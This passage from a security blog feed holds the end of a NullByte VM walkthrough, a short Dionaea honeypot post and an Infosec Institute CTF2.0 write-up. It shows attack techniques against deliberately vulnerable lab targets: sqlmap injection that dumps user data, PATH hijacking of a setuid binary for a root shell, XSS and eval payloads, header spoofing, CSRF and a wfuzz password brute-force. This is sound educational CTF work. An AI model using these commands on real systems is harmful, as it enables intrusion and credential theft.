&lt;span class="o"&gt;[&lt;/span&gt;11:13:26&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; GET parameter &lt;span class="s1"&gt;'usrtosearch'&lt;/span&gt; seems to be &lt;span class="s1"&gt;'MySQL &amp;gt;= 5.0.12 AND time-based blind (SELECT - comment)'&lt;/span&gt; injectable
&lt;span class="o"&gt;[&lt;/span&gt;11:13:26&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; testing &lt;span class="s1"&gt;'Generic UNION query (NULL) - 1 to 20 columns'&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;11:13:26&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; testing &lt;span class="s1"&gt;'MySQL UNION query (NULL) - 1 to 20 columns'&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;11:13:26&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; automatically extending ranges &lt;span class="k"&gt;for&lt;/span&gt; UNION query injection technique tests as there is at least one other &lt;span class="o"&gt;(&lt;/span&gt;potential&lt;span class="o"&gt;)&lt;/span&gt; technique found
&lt;span class="o"&gt;[&lt;/span&gt;11:13:26&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; ORDER BY technique seems to be usable. This should reduce the &lt;span class="nb"&gt;time&lt;/span&gt; needed to find the right number of query columns. Automatically extending the range &lt;span class="k"&gt;for&lt;/span&gt; current UNION query injection technique &lt;span class="nb"&gt;test&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;11:13:26&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; target URL appears to have &lt;span class="m"&gt;3&lt;/span&gt; columns in query
&lt;span class="o"&gt;[&lt;/span&gt;11:13:26&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; GET parameter &lt;span class="s1"&gt;'usrtosearch'&lt;/span&gt; is &lt;span class="s1"&gt;'MySQL UNION query (NULL) - 1 to 20 columns'&lt;/span&gt; injectable
&lt;/pre&gt;
&lt;p&gt;Result! Using this we can now dump the databasenames, tables, and data in the DB&lt;/p&gt;
&lt;p&gt;(output shortened for clarity)&lt;/p&gt;
&lt;pre class="code bash literal-block"&gt;
root&amp;#64;kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch&lt;span class="o"&gt;=&lt;/span&gt;ramses --current-db
back-end DBMS: MySQL 5.0.12
&lt;span class="o"&gt;[&lt;/span&gt;11:13:44&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; fetching current database
current database:    &lt;span class="s1"&gt;'seth'&lt;/span&gt;

root&amp;#64;kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch&lt;span class="o"&gt;=&lt;/span&gt;ramses --tables -D seth
&lt;span class="o"&gt;[&lt;/span&gt;11:13:55&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; fetching tables &lt;span class="k"&gt;for&lt;/span&gt; database: &lt;span class="s1"&gt;'seth'&lt;/span&gt;
Database: seth
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; table&lt;span class="o"&gt;]&lt;/span&gt;
+-------+
&lt;span class="p"&gt;|&lt;/span&gt; users &lt;span class="p"&gt;|&lt;/span&gt;
+-------+


root&amp;#64;kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch&lt;span class="o"&gt;=&lt;/span&gt;ramses --dump -D seth -T users
Database: seth
Table: users
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt; entries&lt;span class="o"&gt;]&lt;/span&gt;
+----+---------------------------------------------+--------+------------+
&lt;span class="p"&gt;|&lt;/span&gt; id &lt;span class="p"&gt;|&lt;/span&gt; pass                                        &lt;span class="p"&gt;|&lt;/span&gt; user   &lt;span class="p"&gt;|&lt;/span&gt; position   &lt;span class="p"&gt;|&lt;/span&gt;
+----+---------------------------------------------+--------+------------+
&lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;  &lt;span class="p"&gt;|&lt;/span&gt; YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE &lt;span class="p"&gt;|&lt;/span&gt; ramses &lt;span class="p"&gt;|&lt;/span&gt; &amp;lt;blank&amp;gt;    &lt;span class="p"&gt;|&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt;  &lt;span class="p"&gt;|&lt;/span&gt; --not allowed--                             &lt;span class="p"&gt;|&lt;/span&gt; isis   &lt;span class="p"&gt;|&lt;/span&gt; employee   &lt;span class="p"&gt;|&lt;/span&gt;
+----+---------------------------------------------+--------+------------+
&lt;/pre&gt;
&lt;p&gt;An MD5 hashed password? I best put that through &lt;a class="reference external" href="http://md5decoder.org/"&gt;md5decoder&lt;/a&gt; to
be rewarded with the password &lt;code&gt;omega&lt;/code&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="stage-4"&gt;
&lt;h2&gt;stage 4&lt;/h2&gt;
&lt;p&gt;Turns out that this is ramses's password on the ssh service that's running on
port 777 on the VM. So I'll connect to that and have a look at what's going on there.&lt;/p&gt;
&lt;p&gt;Not much in his home directory, so I'll checkout what he's been up to&lt;/p&gt;
&lt;pre class="code bash literal-block"&gt;
ramses&amp;#64;NullByte:~$ cat .bash_history
sudo -s
su eric
&lt;span class="nb"&gt;exit&lt;/span&gt;
ls
clear
&lt;span class="nb"&gt;cd&lt;/span&gt; /var/www
&lt;span class="nb"&gt;cd&lt;/span&gt; backup/
ls
./procwatch
clear
sudo -s
&lt;span class="nb"&gt;cd&lt;/span&gt; /
ls
&lt;span class="nb"&gt;exit&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Interesting, ramses has something in &lt;code&gt;/var/www&lt;/code&gt;. Seems like a setuid root
binary called &lt;code&gt;procwatch&lt;/code&gt;. After running it I would assume that it's just running &lt;code&gt;ps&lt;/code&gt;
to return a list of processes. If I run &lt;code&gt;ps&lt;/code&gt; on its own, I get the same output (minus
procwatch of course)&lt;/p&gt;
&lt;p&gt;So let's see if it calls &lt;code&gt;ps&lt;/code&gt; with an absolute path, or not. As a quick test I'll create
a symlink to &lt;code&gt;ls&lt;/code&gt; in the current directory and name it &lt;code&gt;ps&lt;/code&gt;. Then I set the &lt;code&gt;PATH&lt;/code&gt; environment variable
with the current dir at the front.&lt;/p&gt;
&lt;pre class="code bash literal-block"&gt;
ramses&amp;#64;NullByte:/var/www/backup$ ln -s /bin/ls ps
ramses&amp;#64;NullByte:/var/www/backup$ &lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;&lt;span class="nb"&gt;pwd&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;:&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;PATH&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
ramses&amp;#64;NullByte:/var/www/backup$ ./procwatch
ls  procwatch  ps  readme.txt
&lt;/pre&gt;
&lt;p&gt;Excellent, it just calls &lt;code&gt;ps&lt;/code&gt; without a path. A classic issue you can often
find in programs that call other programs.&lt;/p&gt;
&lt;p&gt;So let me leverage this to get myself a root shell and ultimately the flag&lt;/p&gt;
&lt;pre class="code bash literal-block"&gt;
ramses&amp;#64;NullByte:/var/www/backup$ ln -snf /bin/sh ps
ramses&amp;#64;NullByte:/var/www/backup$ ./procwatch
&lt;span class="c1"&gt;# whoami
&lt;/span&gt;root
&lt;span class="c1"&gt;# cat /root/proof.txt
&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;OUTPUT CUT&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;And that concludes the NullByte VM walkthrough. A nice little machine with some fun
challenges. Thanks to ly0n for creating it.&lt;/p&gt;
&lt;/div&gt;
</summary></entry><entry><title>Honeypotting with Dionaea and Raspi</title><link href="http://unlogic.co.uk/2015/07/16/honeypotting-with-dionaea-and-raspi/" rel="alternate"></link><updated>2015-07-16T12:00:00+01:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2015-07-16:2015/07/16/honeypotting-with-dionaea-and-raspi/</id><summary type="html">&lt;p&gt;I recently setup a &lt;a class="reference external" href="http://dionaea.carnivore.it/"&gt;dionaea&lt;/a&gt; honeypot on my Raspberry Pi
and after tweaking and configuring it for a few days have now got a working setup.
It's a low interaction honeypot aimed to capture malware rather than ssh bruteforce
attacks.&lt;/p&gt;
&lt;p&gt;I plan to leave it online for a week or a month, and the analyse the stats and see
what it managed to collect. So far it's mostly conficker variants, but there's a
suprising (to me) large number of infected machines out there. In one 8 hour period
during testing, it managed to collect 8 unique samples from 154 connections.&lt;/p&gt;
&lt;p&gt;Here's the stats from that period:&lt;/p&gt;
&lt;a class="reference external image-reference" href="http://i.imgur.com/j828Fpw.png"&gt;&lt;img alt="" src="http://i.imgur.com/j828Fpw.png" style="width: 500px;" /&gt;&lt;/a&gt;
&lt;p&gt;It should be fairly interesting to see if anything else comes along during its
uptime.&lt;/p&gt;
</summary></entry><entry><title>Infosec Institute CTF2.0</title><link href="http://unlogic.co.uk/2015/06/25/infosec-institute-ctf20/" rel="alternate"></link><updated>2015-07-06T19:00:00+01:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2015-06-25:2015/06/25/infosec-institute-ctf20/</id><summary type="html">&lt;p&gt;The folks over at the &lt;a class="reference external" href="https://infosecinstitute.com"&gt;Infosec Institue&lt;/a&gt; have released
their &lt;a class="reference external" href="http://ctf.infosecinstitute.com/ctf2/"&gt;second CTF&lt;/a&gt;. Here's how I got on...&lt;/p&gt;
&lt;div class="section" id="level-01"&gt;
&lt;h2&gt;Level 01&lt;/h2&gt;
&lt;p&gt;In &lt;a class="reference external" href="http://ctf.infosecinstitute.com/ctf2/exercises/ex1.php"&gt;level 01&lt;/a&gt; I am supposed
to use the provided form to perform a cross site scripting exploit. Here's what the form
looks like:&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/CJTNyK4.png" style="width: 500px;" /&gt;
&lt;p&gt;At first I might as well test how the form works. Entering something like &lt;code&gt;test&lt;/code&gt; and
&lt;code&gt;www.test.com&lt;/code&gt; in the fields simply adds the supplied information to the column on the left.
So I try the usual XSS payload: &lt;code&gt;&amp;lt;script&amp;gt;alert(&amp;quot;Ex1&amp;quot;);&amp;lt;/script&amp;gt;&lt;/code&gt; in the &lt;code&gt;Site Name&lt;/code&gt; field.&lt;/p&gt;
&lt;p&gt;A popup tells me that I need to &lt;em&gt;match the requested format&lt;/em&gt;. Probably some client side
checks, so I inspect the field with Firebug and notice this:&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/f5KzFDx.png" /&gt;
&lt;p&gt;The field has a regular expression premitting only upper or lowercase characters. I can either
delete this or just change it to &lt;code&gt;.+&lt;/code&gt; so it matches any character.&lt;/p&gt;
&lt;p&gt;Now resubmitting the XSS payload works and the string is reflected on the page:&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/yvSc4To.png" /&gt;
&lt;p&gt;However, there's no pop up. So there must be something else validating input. Heading back to the
source I find some javscript in &lt;code&gt;ex1.js&lt;/code&gt; which contains the following code:&lt;/p&gt;
&lt;a class="reference external image-reference" href="http://i.imgur.com/VVe74tW.png"&gt;&lt;img alt="" src="http://i.imgur.com/VVe74tW.png" style="width: 500px;" /&gt;&lt;/a&gt;
&lt;p&gt;The &lt;code&gt;siteName&lt;/code&gt; variable has all &lt;code&gt;&amp;lt;&lt;/code&gt; and &lt;code&gt;&amp;gt;&lt;/code&gt; characters replaced with their equivalent html codes.
By clicking on the gutter in the source code I set a breakpoint on the line that does this, and resubmit
my data. The Firebug debugger breaks on the line and I step over it. Sure enough &lt;code&gt;siteName&lt;/code&gt; is not
what I want it to be. Double clicking on the value in the right hand window allows me to edit it, and
revert it back to what I want it to be. Then clicking continue I am rewarded with:&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/VEFDpio.png" /&gt;
&lt;/div&gt;
&lt;div class="section" id="level-02"&gt;
&lt;h2&gt;Level 02&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="http://ctf.infosecinstitute.com/ctf2/exercises/ex2.php"&gt;Level 02&lt;/a&gt; is a simple web calculator:&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/asgTWCw.png" /&gt;
&lt;p&gt;I'm supposed to use the form to print &lt;code&gt;phpinfo&lt;/code&gt; or other data to the page. This is a PHP
script evaluating a simple expression. I am guessing that it's going to be calling &lt;code&gt;eval&lt;/code&gt;, as
that's a fairly common vulnerability, and fits to how the page works. After entering some numbers
and other characters into the two fields I quickly learn that the input for those fields is checked.
That means I can't enter anything but numbers into those fields. That leaves the operator as the only
other thing under our control.&lt;/p&gt;
&lt;p&gt;I'm going to guess that code looks somewhat like this:&lt;/p&gt;
&lt;pre class="code php literal-block"&gt;
&lt;span class="x"&gt;eval (&amp;quot;print $num1 $op $num2;&amp;quot;);&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;So I need to change the operand to something that prints &lt;code&gt;phpinfo&lt;/code&gt; but leaves the rest of the statement
valid. With Firebug I can edit the value of the operand to the following:&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/8xnqMxv.png" /&gt;
&lt;p&gt;Hit submit and....&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/rUgaixe.png" /&gt;
&lt;/div&gt;
&lt;div class="section" id="level-03"&gt;
&lt;h2&gt;Level 03&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="http://ctf.infosecinstitute.com/ctf2/exercises/ex3.php"&gt;Level 03&lt;/a&gt; provides me with a registration
form and a login form. The instructions indicate that the data is stored in a delimited file and I need
to sign up as a new user with admin rights.&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/f0g5TmV.png" style="width: 500px;" /&gt;
&lt;p&gt;First things first, let's see if we can figure out the delimiter... Signing up and logging in
shows us our name and current role: &lt;code&gt;role:normal&lt;/code&gt;. This already tells me that the delimiter is not
&lt;code&gt;:&lt;/code&gt;. After fuzzing the input it turns out most characters are ok to use. So what's the delimeter?
I check the hints and it tells me that it's the newline character. Interesting, in my fuzzing I tried that,
but had no luck. Unless..&lt;/p&gt;
&lt;p&gt;So let's not use &lt;code&gt;\n&lt;/code&gt; but a real new line. I can achieve this by editing the source with Firebug
once again, changing the &lt;code&gt;lastname&lt;/code&gt; field to a &lt;code&gt;textarea&lt;/code&gt; type:&lt;/p&gt;
&lt;a class="reference external image-reference" href="http://i.imgur.com/QBVptMv.png"&gt;&lt;img alt="" src="http://i.imgur.com/QBVptMv.png" style="width: 500px;" /&gt;&lt;/a&gt;
&lt;p&gt;Now I can have multiple lines and enter a real carriage return into the field. My last
name will be&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="go"&gt;alpha7
role:admin&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;And after a login with the new creds:&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/Akj9NL8.png" /&gt;
&lt;/div&gt;
&lt;div class="section" id="level-04"&gt;
&lt;h2&gt;Level 04&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="http://ctf.infosecinstitute.com/ctf2/exercises/ex4.php"&gt;Level 04&lt;/a&gt;&lt;/p&gt;
&lt;a class="reference external image-reference" href="http://i.imgur.com/nmRe8U2.png"&gt;&lt;img alt="" src="http://i.imgur.com/nmRe8U2.png" style="width: 500px;" /&gt;&lt;/a&gt;
&lt;p&gt;Here we need to load a php file instead of the text files that load when you click
on the &lt;em&gt;Bio&lt;/em&gt;, &lt;em&gt;Clients&lt;/em&gt;, or &lt;em&gt;About&lt;/em&gt; buttons. The instructions are very clear,
but it sounds like we need to load a phop file from the root of the domain. Let's
see what restrictions are in place.&lt;/p&gt;
&lt;p&gt;Fuzzing the file parameter I notice that it seems to test for &lt;code&gt;fileNiXtxt&lt;/code&gt; where &lt;em&gt;N&lt;/em&gt; is
any number and &lt;code&gt;X&lt;/code&gt; is any other character. Anything other than that pattern will print &lt;code&gt;Invalid file selected.&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Entering &lt;code&gt;index.php;file1.txt&lt;/code&gt; for example gives a different error: &lt;code&gt;There is something else that you must do.&lt;/code&gt;.
Interesting. So I guess it just needs to be somewhere in that argument for the filter to accept it. But
how can we accomplish this with a valid payload?&lt;/p&gt;
&lt;p&gt;One thing I tried was &lt;code&gt;/file1/txt/../../file.php&lt;/code&gt; which wasn't right either. Here we make use
of relative paths where when PHP opens the file, it will ignore the fact that the path
&lt;code&gt;/file1/txt&lt;/code&gt; doesn't exist and treat this as if &lt;code&gt;file.php&lt;/code&gt; as at &lt;code&gt;/&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;UPDATE: Solved&lt;/p&gt;
&lt;p&gt;So the key bit I was missing was that it wanted a remote, even if that remote is the
same domain as the current page. So I added &lt;code&gt;http://infosecinstitute.com/file3.php&lt;/code&gt; as
the argument to get a new error: &lt;em&gt;You are trying to add a remote URL.&lt;/em&gt; Ok, now we are getting somewhere.
As one of the hints is that the regex might be case sensitive, let's capitalise the &lt;code&gt;h&lt;/code&gt; in &lt;code&gt;http&lt;/code&gt;.
This time we get an &lt;em&gt;invalid file&lt;/em&gt; message, so that bypass worked. Now we need to satisfy the
&lt;code&gt;file3.txt&lt;/code&gt; requirement and using &lt;code&gt;Http://infosecinstitute.com/file3.txt.php&lt;/code&gt; I get the flag&lt;/p&gt;
&lt;a class="reference external image-reference" href="http://i.imgur.com/WTFYtJi.png"&gt;&lt;img alt="" src="http://i.imgur.com/WTFYtJi.png" style="width: 500px;" /&gt;&lt;/a&gt;
&lt;/div&gt;
&lt;div class="section" id="level-05"&gt;
&lt;h2&gt;Level 05&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="http://ctf.infosecinstitute.com/ctf2/exercises/ex5.php"&gt;Level 05&lt;/a&gt; starts by telling
me that I am not logged in.&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/BOBdkHX.png" /&gt;
&lt;p&gt;Well, I don't remember logging in, so that's not unusual. What is unusual is
that the &lt;code&gt;login&lt;/code&gt; button doesn't work. I'll quickly check the source code and notice
that it's disabled, but also that it points to &lt;code&gt;login.html&lt;/code&gt;. Enabling and clicking it
takes me to a 404, so no go. The vulnerability here is &lt;em&gt;Missing Function Level Access Control&lt;/em&gt;
so perhaps this page assumes we're logged in if we are coming from the login page. Let's
assume that if the user is successful on &lt;code&gt;login.html&lt;/code&gt;, that page will redirect here, and then
this page will just assume that the user is allowed to be here.&lt;/p&gt;
&lt;p&gt;Using an intercepting proxy I'll edit the &lt;code&gt;Referer&lt;/code&gt; field in the original request, so that
it appears to be coming from the login page:&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/EK9u7Ir.png" /&gt;
&lt;p&gt;Forward the request and&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/QCisDvN.png" /&gt;
&lt;/div&gt;
&lt;div class="section" id="level-06"&gt;
&lt;h2&gt;Level 06&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="http://ctf.infosecinstitute.com/ctf2/exercises/ex6.php"&gt;Level 06&lt;/a&gt; shows a nice
big text area with allowable HTML tags.&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/Waq1AVN.png" /&gt;
&lt;p&gt;This time I need to perform a cross site request forgery. This can be accomlished by an &lt;code&gt;href&lt;/code&gt;
tag, but trying this tells me that they are expecting something that will perform the request
without the need for user interaction. Ok, fine, let's revisit the allowed tags. &lt;code&gt;img&lt;/code&gt; looks useful, right?&lt;/p&gt;
&lt;p&gt;Let's try the following&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/qCd5NUP.png" /&gt;
&lt;p&gt;Yep, that's what we needed.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="level-07"&gt;
&lt;h2&gt;Level 07&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="http://ctf.infosecinstitute.com/ctf2/exercises/ex7.php"&gt;Level 07&lt;/a&gt; is a login form on which
we need to perform another XSS attack.&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/WO8dRpe.png" style="width: 500px;" /&gt;
&lt;p&gt;Well, lucky for me I perform these challenges through a proxy which unhides hidden fields like
the one you see there. Some investigation shows that the value of the hidden field comes from
a php_self value. That is it uses whatever the URL part is to populate the field, so that form
is submitted back to itself.&lt;/p&gt;
&lt;p&gt;Using this we can inject something into the field to hopefully reflect our data on the page.
By employing the &lt;code&gt;arg&lt;/code&gt; paramater we can close the &lt;code&gt;input&lt;/code&gt; tag, and the inject our &lt;code&gt;h1&lt;/code&gt; tags:&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="go"&gt;http://ctf.infosecinstitute.com/ctf2/exercises/ex7.php?arg='&amp;gt;&amp;lt;h1&amp;gt;username&amp;lt;/h1&amp;gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Submitting that puts &lt;code&gt;username&lt;/code&gt; on the page surrounded by &lt;code&gt;h1&lt;/code&gt; tags and nabs the flag&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="level-08"&gt;
&lt;h2&gt;Level 08&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="http://ctf.infosecinstitute.com/ctf2/exercises/ex8.php"&gt;Level 08&lt;/a&gt;&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/610ZNNq.png" /&gt;
&lt;p&gt;Here we need to upload an image that will produce a javscript alert. First things first with these
things I upload an image to see how it behaves. Once uploaded I click on the example links and notice that
images are fetched via an id. The URL is&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="go"&gt;http://ctf.infosecinstitute.com/ctf2/exercises/ex8.php?attachment_id=1&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;So let me see if I can access an image via another ID, for example &lt;code&gt;id=4&lt;/code&gt;.
I get the message:&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="go"&gt;This attachment is currently under review by our editors.&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;So no. Checking out the image URL for one of the chess images shows me that the images
are stored at &lt;code&gt;http://ctf.infosecinstitute.com/ctf2/ex8_assets/img/chess1.png&lt;/code&gt; for example.&lt;/p&gt;
&lt;p&gt;I make a note of this.&lt;/p&gt;
&lt;p&gt;Now can I just upload an html file? That gives me an error of an invalid file type. So let me chack
if it's just checking the extension or if there's something more happening. Intercepting the upload
request with Burp proxy I can change the extension to &lt;code&gt;jpg&lt;/code&gt; and sucessfully upload the html file.&lt;/p&gt;
&lt;p&gt;Now browsing to the image url I am told it cannot display the image due to errors. Well, the browser
is trying to interpret the file as an image, which it clearly isn't. There's got to be another way
to get at my image. How about the object reference in the URL &lt;code&gt;http://ctf.infosecinstitute.com/ctf2/exercises/ex8.php?attachment_id=1&lt;/code&gt;
for example? Maybe if I just reference the filename directly?&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="go"&gt;http://ctf.infosecinstitute.com/ctf2/exercises/ex8.php?file=index.jpg&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Success&lt;/p&gt;
&lt;p&gt;&lt;a class="reference external" href="http://i.imgur.com/RVoJGMr.png"&gt;{ %img http://i.imgur.com/RVoJGMr.png %}&lt;/a&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="level-09"&gt;
&lt;h2&gt;Level 09&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="http://ctf.infosecinstitute.com/ctf2/exercises/ex9.php"&gt;Level 09&lt;/a&gt; starts off by showing me the
details of one John Doe.&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/8NESmpB.png" /&gt;
&lt;p&gt;I need to change something to make it show the details for Mary Jane. There's no URL parms,
no login, so how can the page know who to show? There's one place left: the cookie jar.&lt;/p&gt;
&lt;p&gt;Using Firebug once again I inspect the cookies and sure enough&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/xGdtDa7.png" /&gt;
&lt;p&gt;This is &amp;quot;JOHN+DOE&amp;quot; encoded as base64 as it turns out. One thing to note is when you&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="go"&gt;echo Sk9ITitET0u= | base64 -d&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;there is no newline at end of the name. So to encode &lt;code&gt;MARY+JANE&lt;/code&gt; correctly I need to
use echo with the &lt;code&gt;-n&lt;/code&gt; flag:&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;$&lt;/span&gt;&amp;gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -n MARY+JANE &lt;span class="p"&gt;|&lt;/span&gt; base64
&lt;span class="go"&gt;TUFSWStKQU5F&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Editing the cookie and inserting that base64 string will show us Mary Jane's details.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="level-10"&gt;
&lt;h2&gt;Level 10&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="http://ctf.infosecinstitute.com/ctf2/exercises/ex10.php"&gt;Level 10&lt;/a&gt; is a game and we need to
edit its source so we look like we're really good at it.&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/g03njlQ.png" style="width: 500px;" /&gt;
&lt;p&gt;Entering anything in the name I field I have a poke around to see how the whole thing
works. We're shown some coloured squares and then they are turn over. We need to then
remember which colour each square had. Except we need to do it at least 9999 times and
at the extreme level, which only shows us the squares for a second.&lt;/p&gt;
&lt;p&gt;Finding the square colours isn't hard. With Firebug we can see:&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/isDO7LM.png" /&gt;
&lt;p&gt;and those numbers are 0 indexed into the list of numbers from the selction popup. So playing
along I can win one game. So let's find out where my current win/loss count is stored.&lt;/p&gt;
&lt;p&gt;In the Javscript I find a structure that does this:&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/gZghIIn.png" /&gt;
&lt;p&gt;but all this does is increment and decrement the values. Clearly that data is stored somewhere.
Turns out that this &lt;code&gt;localstorage&lt;/code&gt; is in the DOM. Using the &lt;em&gt;DOM&lt;/em&gt; tab in Firebug I can find
the structure and its data:&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/xGIZXpb.png" /&gt;
&lt;p&gt;Now I can edit the number of wins and then, all I need to do is play one more game to take the flag.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="level-11"&gt;
&lt;h2&gt;Level 11&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="http://ctf.infosecinstitute.com/ctf2/exercises/ex11.php"&gt;Level 11&lt;/a&gt; blacklists me&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/RaGy98O.png" /&gt;
&lt;p&gt;Awwwww I was having such fun. But how? Not from my IP, as that's going to change. First thing
to check: cookie jar. Yay!&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/QgGrvwE.png" /&gt;
&lt;p&gt;There it is, a big &lt;code&gt;no&lt;/code&gt;. I'll change that to a &lt;code&gt;yes&lt;/code&gt;, reload and take the flag, thanks very much.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="level-12"&gt;
&lt;h2&gt;Level 12&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="http://ctf.infosecinstitute.com/ctf2/exercises/ex12.php"&gt;Level 12&lt;/a&gt; is a bruteforce challange. No
login attempt limits, no rate limits, so it's ripe for the picking.&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/LMUBNoq.png" /&gt;
&lt;p&gt;After searching for the suggested password list, the first hit is the Openwall password list for
john the ripper. So why not download it and give it a try?&lt;/p&gt;
&lt;p&gt;I fire up &lt;code&gt;wfuzz&lt;/code&gt; with the following commandline&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;$&lt;/span&gt;&amp;gt; wfuzz -c -z file,/usr/share/wordlists/password-2011.lst --hw Incorrect -d &lt;span class="s2"&gt;&amp;quot;username=admin&amp;amp;password=FUZZ&amp;amp;logIn=Login&amp;quot;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://ctf.infosecinstitute.com/ctf2/exercises/ex12.php&amp;quot;&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Within a few seconds I get a hit with &lt;code&gt;princess&lt;/code&gt;. Enter that with the username &lt;code&gt;admin&lt;/code&gt; and onto the next level&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="level-13"&gt;
&lt;h2&gt;Level 13&lt;/h2&gt;
